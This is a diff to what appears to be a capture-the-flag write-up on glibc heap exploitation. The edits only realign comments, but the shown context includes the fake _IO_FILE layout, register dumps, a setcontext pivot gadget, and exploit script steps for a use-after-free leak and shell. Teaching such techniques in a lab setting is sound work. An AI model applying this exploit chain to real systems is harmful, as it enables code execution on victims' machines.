@@ -313,12 +313,12 @@ Here's the `_IO_FILE` structure for reference (216 bytes + 8 byte vtable pointer
  0x08    _IO_read_ptr       ← size field of chunk
  0x10    _IO_read_end       ──┐
  0x18    _IO_read_base        │
- 0x20    _IO_write_base        │  these start at user data (P2)
- 0x28    _IO_write_ptr          │  so we control everything from 0x10+
- 0x30    _IO_write_end         │
- 0x38    _IO_buf_base          │
- 0x40    _IO_buf_end           │
-  ...    ...                   │
+ 0x20    _IO_write_base       │  these start at user data (P2)
+ 0x28    _IO_write_ptr        │  so we control everything from 0x10+
+ 0x30    _IO_write_end        │
+ 0x38    _IO_buf_base         │
+ 0x40    _IO_buf_end          │
+  ...    ...                  │
  0x88    _lock              ──┘
  0xa0    _wide_data         ← points to our fake wide_data
  0xd8    vtable             ← _IO_wfile_jumps - 24
@@ -384,7 +384,7 @@ It reads all registers from `$rdx`. But the problem is - what's in `$rdx` when w
  RAX  0x55555815a6f4 ◂— 0         ← points into our chunk!
  RBX  0x55555815a5e0 ◂— 0         ← our fake FILE (fp)
  RCX  0x811
- RDX  0x911                        ← chunk size, NOT useful
+ RDX  0x911                       ← chunk size, NOT useful
  RDI  0x55555815a5e0 ◂— 0         ← our fake FILE (fp)
 ```
 
@@ -415,9 +415,9 @@ setcontext+68:    mov  rbx, [rdx + 0x80]
    ...
 setcontext+95:    ...
                   mov  rcx, [rdx + 0xa8]   ; set rcx
-                  push rcx                  ; push return address
+                  push rcx                 ; push return address
                   ...
-                  ret                       ; jump to rcx
+                  ret                      ; jump to rcx
 ```
 
 Since we control `$rdx` and the memory it points to (it's our heap chunk), we can:
@@ -459,7 +459,7 @@ All that's left is to trigger an error that calls `fwrite` to our corrupted `std
 
 ```python
 p.sendlineafter(b'>', b'123')  # Invalid menu option → fwrite(stderr)
-p.interactive()                 # Shell!
+p.interactive()                # Shell!
 ```
 
 ## Full Exploit
@@ -523,9 +523,9 @@ create_slab(2, 0x502)   # O2 guard
 create_slab(3, 0x900)   # P2 target chunk
 
 # --- Step 2: Leak libc & heap ---
-delete_slab(1)           # P1 → unsorted bin
+delete_slab(1)          # P1 → unsorted bin
 create_slab(9, 0x930)   # Force P1 into large bin
-data = read_slab(1)      # UAF read
+data = read_slab(1)     # UAF read
 
 MAIN_ARENA = u64(data[:8]) - 1424
 libc.address = MAIN_ARENA - MAIN_ARENA_OFFSET
